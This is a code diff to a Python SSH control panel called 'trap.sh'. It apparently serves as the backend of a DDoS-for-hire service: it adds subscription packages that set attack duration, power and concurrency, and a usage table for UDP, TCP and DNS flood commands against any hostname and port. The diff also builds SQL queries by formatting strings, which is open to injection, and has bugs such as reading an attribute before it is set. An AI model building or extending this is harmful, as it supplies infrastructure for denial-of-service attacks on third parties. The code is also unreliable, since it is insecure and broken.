@@ -1,7 +1,10 @@
+import datetime
 from logging import exception
 from pickle import TRUE
+from re import S
+import time
 from xmlrpc.client import Transport
-from attacks import methodlist, method, usage
+from attacks import methodlist, method, connected, running
 import paramiko
 import sqlite3
 import hashlib
@@ -10,6 +13,7 @@ import random
 import string
 import sys
 import io
+import json
 
 ANSI_SEQ = "\x1b[{}m"
 FG_RGB = "38;2;{};{};{}"
@@ -35,6 +39,45 @@ ATTRS = {key:code for key, code in [line.strip().split()   for line in """\
 """.split("\n")]}
 
 #objects
+f = open('subs.json', 'r')
+data = json.load(f)
+f.close()
+allsubs = data['subs']
+
+
+class sub:
+    def subid(self, uid: int) -> str:
+        try:
+            sql = "SELECT sub FROM subs WHERE uid={}"
+            connection = sqlite3.connect("./trappers.db", isolation_level=None)
+            cursor = connection.cursor()
+            val = cursor.execute(sql.format(uid))
+            connection.close()
+            return val
+        except Exception as e:
+            print(e)
+            return False
+
+    def __init__(self, name: str, hittime: int, concurrents: int, power: str, cd: int) -> None:
+        self.name = name
+        self.hittime = hittime
+        self.concurrents = concurrents
+        self.power = int(self.power[:-1])
+        self.cooldown = cd
+
+def def_sub(subi: int) :
+        try:
+            s = allsubs[subi]
+            name = s['name']
+            maxtime = int(s['maxtime'])
+            power = s['power']
+            con = int(s['con'])
+            cd = int(s['cd'])
+            return sub(name, maxtime, con, power, cd)
+        except Exception as e:
+            print('ds=' + e)
+            return 0
+
 class User:
     def update_ip(self, ip) -> bool:
         try:
@@ -82,8 +125,22 @@ class User:
             cursor = connection.cursor()
             sub = cursor.execute("SELECT sub FROM subs WHERE uid = {}".format(self.uid)).fetchone()
             connection.close()
-            return int(sub)
+            return int(sub[0])
         except Exception as e:
+            return -1
+
+    def daysleft(self) -> int:
+        try:
+            connection = sqlite3.connect("./trappers.db", isolation_level=None)
+            cursor = connection.cursor()
+            daysleft = cursor.execute("SELECT enddt FROM subs WHERE uid = {}".format(self.uid)).fetchone()
+            connection.close()
+            now = datetime.datetime.now()
+            then = time.strptime(daysleft[0], "%Y-%m-%d %H:%M:%S")
+            diff = (datetime.datetime(*then[:6]) - now).days
+            return diff
+        except Exception as e:
+            print(e)
             return -1
     
     def get_attack_count(self) -> int:
@@ -113,6 +170,32 @@ class User:
         self.super = soup #get is super
 
 #backend functions
+def sub_count():
+    try:
+        connection = sqlite3.connect("./trappers.db", isolation_level=None)
+        cursor = connection.cursor()
+        val = cursor.execute('SELECT count(*) FROM subs').fetchone()
+        connection.close()
+        return int(val[0])
+    except Exception as e:
+        print(e)
+        return -1
+
+def create_sub(chan: paramiko.Channel, subid: int, days: int, uid: int):
+        try:
+            usr = User(chan.transport.get_username())
+            if usr.admin == 0 and usr.super == 0:
+                return 0
+            sql = "INSERT INTO subs VALUES ({},{},{},{},DATETIME(DATE('now'), '+{} days'))"
+            connection = sqlite3.connect("./trappers.db", isolation_level=None)
+            cursor = connection.cursor()
+            val = cursor.execute(sql.format(sub_count(), uid, subid, "DATE('now')", days))
+            connection.close()
+            return 2
+        except Exception as e:
+            print(e)
+            return 1
+
 def colored_(*args, **kw) -> str:
     """Extends print function to add color printing parameters in compatible terminals.
     Use the optional bg= or fg= parameters to pass colors for foreground or background
@@ -202,6 +285,7 @@ def add_user_raw(username, password, admin, soup) -> bool:
         return True
     except Exception as e:
         return False
+        
 def banuser(chan: paramiko.Channel, usertoban: str) -> int:
     user = User(chan.transport.get_username())
     banee = User(usertoban)
@@ -248,12 +332,59 @@ def add_user(chan: paramiko.Channel, username: str, password=''.join(random.choi
     user = User(chan.transport.get_username())
     if user.admin == 0 and user.super == 0:
         return 'insufficient permissions'
-    if user.admin == 0 and soup == 1:
+    if user.admin == 1 and user.super == 0:
         return 'insufficient permissions'
     result = add_user_raw(username, password, admin, soup)
     if result == True:
         return 'success'
     return 'failure'
+
+def print_all_subs(chan: paramiko.Channel):
+    try:
+        user = User(chan.transport.get_username())
+        if user.admin == 0 and user.super == 0:
+            return 0
+        clear_terminal(chan, False)
+        
+        sbanner = """\r
+        
+                      ╔═════════════════════════╗
+                      ║        [trap.sh]        ║
+        ╔════╦════════╩═════╦════════╦═══════╦══╩══════════╦══════════╗
+        ║ ID ║     name     ║  time  ║ power ║ concurrents ║ cooldown ║
+        ╠════╬══════════════╬════════╬═══════╬═════════════╬══════════╣"""
+        end = """
+        ╚════╩══════════════╩════════╩═══════╩═════════════╩══════════╝\n"""
+        
+        for d in allsubs:
+            subid = d['id']
+            name = d['name']
+            maxtime = d['maxtime']
+            power = d['power']
+            concurrents = d['con']
+            cd = d['cd']
+            entry = """
+        ║ {:<{}s} ║ {:<{}s} ║ {:<{}s} ║ {:<{}s} ║ {:<{}s} ║ {:<{}s} ║\n""".format(
+            subid, 2,
+            name, 12,
+            maxtime, 6,
+            power, 5,
+            concurrents, 11,
+            cd, 8)
+            entry = entry[:-1]
+            sbanner = sbanner + entry
+        sbanner = sbanner + end
+        sbanner = sbanner[4:-1]
+        zstr = ""
+        for i in range(len(sbanner.split("\n"))):
+            zstr = zstr + str(colored_(sbanner.split("\n")[i], start_fg=[255 - (i * 10),0,(0 + (i * 10))], end_fg=[i * 10,0,(255 - (i * 10))])) + '\r\n'
+        
+        for i in zstr.split("\r"):
+            chan.send(i + '\r')
+    except Exception as e:
+        print(e)
+        return
+        
 
 def print_user_info(chan: paramiko.Channel, username: str):
     try:
@@ -274,6 +405,8 @@ def print_user_info(chan: paramiko.Channel, username: str):
                       ║ [Is admin]: {:<{}s}║
                       ║ [Is super]: {:<{}s}║
                       ║ [Attacks]: {:<{}s}║
+                      ║ [Package]: {:<{}s}║
+                      ║ [Days left]: {:<{}s}║
                       ╚═══════════════════════════╝\n""".format(
                           str(user.uid), 13, 
                           user.username, 14, 
@@ -281,13 +414,15 @@ def print_user_info(chan: paramiko.Channel, username: str):
                           str(user.status), 11,
                           str(user.admin), 14, 
                           str(user.super), 14, 
-                          str(user.get_attack_count()), 15)
+                          str(user.get_attack_count()), 15,
+                          str(allsubs[user.get_sub()]['name']), 15,
+                          str(user.daysleft()), 13)
         for i in range(len(pbanner.split("\n"))):
             zstr = zstr + str(colored_(pbanner.split("\n")[i], start_fg=[255 - (i * 10),0,(0 + (i * 10))], end_fg=[i * 10,0,(255 - (i * 10))])) + '\r\n'
         chan.send('    ' + str(zstr[4:-6]))
         return 2
     except Exception as e:
-        print(e)
+        print('z=' + e)
         return 1
 
 #misc functions
@@ -310,7 +445,8 @@ def send_banner(chan: paramiko.Channel):
                   ║ [uid]: {:<{}s}║
                   ║ [user]: {:<{}s}║
                   ║ [your ip]: {:<{}s}║
-                  ╚═══════════════════════════╝\n""".format(str(usr.uid), 19, usr.username, 18, usr.last_ip, 15)
+                  ║ [days left]: {:<{}s}║
+                  ╚═══════════════════════════╝\n""".format(str(usr.uid), 19, usr.username, 18, usr.last_ip, 15, str(usr.daysleft()), 13)
     for i in range(len(pbanner.split("\n"))):
         zstr = zstr + str(colored_(pbanner.split("\n")[i], start_fg=[255 - (i * 10),0,(0 + (i * 10))], end_fg=[i * 10,0,(255 - (i * 10))])) + '\r\n'
     for i in zstr[4:-6].split("\r"):
@@ -416,7 +552,8 @@ admincmds = {
     "ban": "Ban a user from the system",
     "user": "View the account details of a user",
     "unban": "Unban a user from the system",
-    "adduser": "Add a user to the system"
+    "adduser": "Add a user to the system",
+    "addsub": "Assign a package to a user"
 }
 
 about = {
@@ -425,7 +562,8 @@ about = {
     "exit": "Quits the current session",
     "cls": "Clear the terminal, print banner",
     "passwd": "Change your password",
-    "attacks": "List all of your attacks"
+    "attacks": "List all of your attacks",
+    "sublist": "List all available packages"
 }
 
 functions = { 
@@ -438,5 +576,22 @@ functions = {
     "user": print_user_info,
     "attacks": print_attacks,
     "ban": banuser,
-    "unban": unbanuser
+    "unban": unbanuser,
+    "sublist": print_all_subs,
+    "addsub": create_sub
+}
+
+usage = {
+    #attack methods
+    "udp": "udp (hostname) (port) (seconds)",
+    "tcp": "tcp (hostname) (port) (seconds)",
+    "dns": "dns (hostname) (port) (seconds)",
+    
+    #normal functions
+    "passwd": "passwd (new password)",
+    "adduser": "adduser (username) (password) (admin) (super)",
+    "user": "user (username)",
+    "ban": "ban (username)",
+    "unban": "unban (username)",
+    "addsub": "addsub (username) (sub id (check sublist for ids)) (days)"
 }
